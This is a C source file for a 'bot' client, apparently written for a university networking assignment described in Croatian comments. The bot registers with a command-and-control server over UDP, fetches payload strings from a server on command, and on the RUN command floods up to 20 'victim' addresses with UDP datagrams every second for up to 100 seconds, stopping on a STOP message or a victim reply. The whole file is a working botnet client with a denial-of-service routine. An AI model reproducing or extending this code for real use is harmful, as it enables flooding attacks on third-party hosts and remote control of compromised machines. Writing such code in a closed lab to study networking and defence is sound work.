#include <err.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "debug.h"
#include "structures.h"
#include "util.h"

#define PAYLOAD_LEN 1025

static volatile bool didSig = false;

void job(char* addr, char* port);
// returns reserved socket
int reg(char* addr, char* port, struct addrinfo** res);
int recvMSG(int sock, char* buf, size_t nrecv);
void command1(int numPairs, char* payload, char* buf, bool* payloadInit);
void command2(int numPairs, char* payload, char* buf, bool* payloadInit, int sock);
void command3(struct addrinfo* cic_ai, int sock, int numPairs, bool payloadInit, char* buf, char* payload);
void command3Send(struct addrinfo* cic_ai, int sock, int numPairs, struct addrinfo** results, char* payload);
void command3SendOne(int numPairs, char* payload, struct addrinfo** results, int sock);
// returns num of chars in next part starting from position start or -1 when there is no next part
// payload1:payload2:...:payloadN:\n
int nextPayloadPart(const char* start);
void handle_alarm(int sig);
bool checkWhoAnswered(struct addrinfo* cic_ai, struct sockaddr* addr, socklen_t socklen, char msg, int numPairs,
                      struct addrinfo** results);

void usage() { fprintf(stderr, "Usage:  ./bot ip port\n"); }

// status 0 ok
// status 1 bad usage...
// status 2 getaddrinfo failed
// status 3 socket creation failed
// status 4 sendTo  failed
// status 5 recvFrom failed
// status 6 command 1 and less than 1 pair received
// status 7 setsockopt failed
// status 10 other
int main(int argc, char** argv) {
   if (argc != 3) {
      usage();
      return 1;
   }

   debug_printf("Arguments recieved: %s %s\n", argv[1], argv[2]);
   job(argv[1], argv[2]);

   return 0;
}

void job(char* addr, char* port) {
   //////////// get udp socket and register at C&C ////////
   struct addrinfo* res;
   int sock = reg(addr, port, &res);
   //////////// END get udp socket and register at C&C ////////

   size_t bufSize = sizeof(struct MSG);
   char buf[bufSize];
   char payload[PAYLOAD_LEN];
   bool payloadInit = false;

   while (1) {
      int numPairs        = recvMSG(sock, buf, bufSize);
      struct MSG* command = (struct MSG*)buf;

      /*Kad bot od C&C poslužitelja primi strukturu MSG s poljem command jednakim 0 (QUIT) program
      bot prestaje s radom.*/
      if (command->command == '0') break;
      if (command->command == '1') command1(numPairs, payload, buf, &payloadInit);
      else if (command->command == '2')
         command2(numPairs, payload, buf, &payloadInit, sock);
      else if (command->command == '3')
         command3(res, sock, numPairs, payloadInit, buf, payload);
   }

   freeaddrinfo(res); // oslobodi alocirani prostor
   close(sock);
}

int reg(char* addr, char* port, struct addrinfo** res) {
   int on = 1;

   GetUDP_addrinfo(addr, port, res, 0, 2, FATAL, "getAddrInfo failed for provided addr and port");
   struct addrinfo* res1 = *res;
   int sock =
       Socket(res1->ai_family, res1->ai_socktype, res1->ai_protocol, 3, FATAL, "Could not complete socket creation");
   Setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on), 7, FATAL, "Setsockopt SO_BROADCAST failed for command 2");

   char* msg   = "REG\n";
   size_t size = strlen(msg);
   Sendto(sock, msg, size, 0, res1->ai_addr, res1->ai_addrlen, 4, FATAL, "partial/failed write to C&C");
   debug_printf("Sent %s\n", msg);

   return sock;
}

int recvMSG(int sock, char* buf, size_t nrecv) {
   ssize_t nread = Recvfrom(sock, buf, nrecv, 0, NULL, NULL, 5, FATAL, "partial/failed read from C&C");
   debug_printf("Recieved %d bytes from C&C\n%s\n", nread, buf);

   struct MSG* command = (struct MSG*)buf;
   int numPairs        = (nread - sizeof(char)) / sizeof(struct addr_pair);
   debug_printf("Recieved %d pairs from C&C\n", numPairs);
   debug_printf("Recieved command %c from C&C\n", command->command);

   for (int i = 0; i < numPairs; i++)
      debug_printf("Recieved IP: %s  PORT: %s  from C&C\n", command->pairs[i].ip, command->pairs[i].port);

   return numPairs;
}

/*Kad bot od C&C poslužitelja primi strukturu MSG s poljem command jednakim 1 (PROG_TCP), spaja
        se na TCP poslužitelj na IP adresi i portu zapisanim u prvom sljedećem zapisu, šalje poruku
        "HELLO\n", učitava odgovor duljine najviše 1024 znaka te zatvara TCP konekciju.

 Kad program server od bot klijenta primi TCP ili UDP poruku "HELLO\n", na odgovarajući TCP
        ili UDP port mu vraća poruku veličine do 1024 znaka oblika:
payload1:payload2:...:payloadN:\n
 */
void command1(int numPairs, char* payload, char* buf, bool* payloadInit) { // ovdje SO_BROADCAST IMA SMISLA SAMO ZA UDP
   if (numPairs < 1) err(6, "Command 1 received but less than 1 pair given");

   char* toSend = "HELLO\n";
   struct addrinfo* res;
   int sfd             = -1;
   struct MSG* command = (struct MSG*)buf;

   ////////// getaddrinfo, socket and connect /////////////
   GetTCP_addrinfo(command->pairs[0].ip, command->pairs[0].port, &res, 0, 2, WARN, "Getaddrinfo for command 1 failed");
   for (struct addrinfo* rp = res; rp != NULL; rp = rp->ai_next) {
      sfd = Socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol, IGNORE, DBG, "Command 1 socket failed");
      if (sfd == -1) continue;
      if (Connect(sfd, rp->ai_addr, rp->ai_addrlen, IGNORE, DBG, "Command 1 connect failed") != -1) break; /* Success */
      close(sfd);
   }
   ////////// END getaddrinfo, socket and connect /////////////

   ///////// get payload /////////////////
   ssize_t r    = Send(sfd, toSend, strlen(toSend), 0, IGNORE, WARN, "Command 1 send failed");
   ssize_t nrec = -1;
   if (r >= 0) nrec = Recv(sfd, (void*)payload, PAYLOAD_LEN - 1, 0, IGNORE, WARN, "Command 1 recv failed");
   if (nrec >= 0) {
      payload[nrec] = '\0';
      *payloadInit  = true;
   }
   ///////// END get payload /////////////////

   close(sfd);
   freeaddrinfo(res);
}

/*
 * Kad bot od C&C poslužitelja primi strukturu MSG s poljem command jednakim 2 (PROG_UDP), na IP
adresu i UDP port primljene u prvom idućem zapisu,̌ salje poruku "HELLO\n" te učitava odgovor
        duljine najviše 1024 znaka.
 */
void command2(int numPairs, char* payload, char* buf, bool* payloadInit, int sock) {
   if (numPairs < 1) err(6, "Command 2 received but less than 1 pair given");

   struct MSG* command = (struct MSG*)buf;
   char* toSend        = "HELLO\n";

   struct addrinfo* res;
   GetUDP_addrinfo(command->pairs[0].ip, command->pairs[0].port, &res, 0, IGNORE, WARN,
                   "Getaddrinfo for command 2 failed");
   if (sock != -1) {
      ssize_t r    = Sendto(sock, toSend, strlen(toSend), 0, res->ai_addr, res->ai_addrlen, IGNORE, WARN,
                         "Send to command 2 failed");
      ssize_t nrec = -1;
      if (r >= 0) nrec = Recvfrom(sock, (void*)payload, 1024, 0, 0, NULL, IGNORE, WARN, "Recv from command 2 failed");
      if (nrec >= 0) {
         payload[nrec] = '\0';
         *payloadInit  = true;
      }
   }
   freeaddrinfo(res);
}

/*
 *
        Kad bot od C&C poslužitelja primi strukturu MSG s poljem command jednakim 3 (RUN), u primljenoj
strukturi su u idućih M zapisa (maksimalno 20 parova) upisane IP adrese i portovi računala koje bot
napada. Tada bot na zadane adrese počinje slati UDP datagrame s porukama payload1, payload2,
..., payloadN primljenima od programa server. Prolazi po dobivenom popisu N payloadova te svaki
od njih šalje jednom na svaku od zadanih M adresa. Svih M*N poruka ponovno šalje svake sekunde,
        maksimalno 100 sekundi, ili ako se na neki od dalje navedenih načina zaustavi slanje.

Kad bilo koja „žrtva” vrati neki podatak botu on prestaje sa slanjem poruka svim „žrtvama”.
Kad bot od C&C poslužitelja primi strukturu MSG s poljem command jednakim 4 (STOP) program
        bot prestaje sa slanjem poruka žrtvama.
*/
void command3(struct addrinfo* cic_ai, int sock, int numPairs, bool payloadInit, char* buf, char* payload) {
   if (numPairs <= 0) {
      debug_printf("Recieved command PROG and 0 adresses!\n");
      return;
   }
   if (!payloadInit) {
      debug_printf("PAYLOAD not initialized!\n");
      return;
   }

   //////////////// get addrinfo for each pair and cache it... //////////////
   struct addrinfo* results[numPairs];
   struct MSG* command = (struct MSG*)buf;
   for (int i = 0; i < numPairs; i++)
      GetUDP_addrinfo(command->pairs[i].ip, command->pairs[i].port, (results + i), 0, 2, DBG,
                      "getAddrInfo failed for given pair");

   command3Send(cic_ai, sock, numPairs, results, payload);

   for (int i = 0; i < numPairs; i++) ///////// freeaddrinfo for each cached
      freeaddrinfo(results[i]);
}

void command3Send(struct addrinfo* cic_ai, int sock, int numPairs, struct addrinfo** results, char* payload) {
   char msgBuf;
   struct sockaddr_in addr;
   socklen_t sizeSockAddr = sizeof(struct sockaddr_in);

   signal(SIGALRM, handle_alarm);
   siginterrupt(SIGALRM, 1);

   handle_alarm(SIGALRM); // izvedi prvi odmah... pa sljedeci nakon sekunde...
   alarm(1);
   for (int numSec = 1; numSec < 100;) {
      ssize_t recvRes = Recvfrom(sock, &msgBuf, sizeof(char), 0, (struct sockaddr*)&addr, &sizeSockAddr, IGNORE, DBG,
                                 "Failed or partial read command 3"); // TODO usporedi je li doslo od C&C ili od zrtve ili netko treci?
      if (recvRes >= 0 && checkWhoAnswered(cic_ai, (struct sockaddr*)&addr, sizeSockAddr, msgBuf, numPairs, results)) // ili > 0??
         break;

      if (didSig) {
         command3SendOne(numPairs, payload, results, sock);
         debug_printf("Sent sec=%d\n", numSec);
         didSig = false;
         numSec++;
         alarm(1);
      }
   }
   alarm(0);
}

void command3SendOne(int numPairs, char* payload, struct addrinfo** results, int sock) {
   ///////////////// begin sending //////////////////
   int nextLen;
   int sumLen = 0;
   while ((nextLen = nextPayloadPart((payload) + sumLen)) != -1) {
      for (int i = 0; i < numPairs; i++) {
         Sendto(sock, (payload + sumLen), nextLen, 0, results[i]->ai_addr, results[i]->ai_addrlen, 4, DBG,
                "Failed to send payload to given pair");
      }

      sumLen += nextLen + 1;
   }
   ///////////////// END sending //////////////////
}

bool checkWhoAnswered(struct addrinfo* cic_ai, struct sockaddr* addr, socklen_t socklen, char msg, int numPairs,
                      struct addrinfo** results) {
   if (cic_ai->ai_addrlen == socklen && memcmp(cic_ai->ai_addr, addr, socklen) == 0 && msg == '4') return true;

   for (int i = 0; i < numPairs; i++) {
      if (results[i]->ai_addrlen == socklen && memcmp(results[i]->ai_addr, addr, socklen) == 0) return true;
   }
   return false;
}

void handle_alarm(int sig) { didSig = true; }

int nextPayloadPart(const char* start) {
   if (start[0] == '\n') return -1;
   int cnt = 0;
   while (start[cnt] != ':') cnt++;
   return cnt;
}
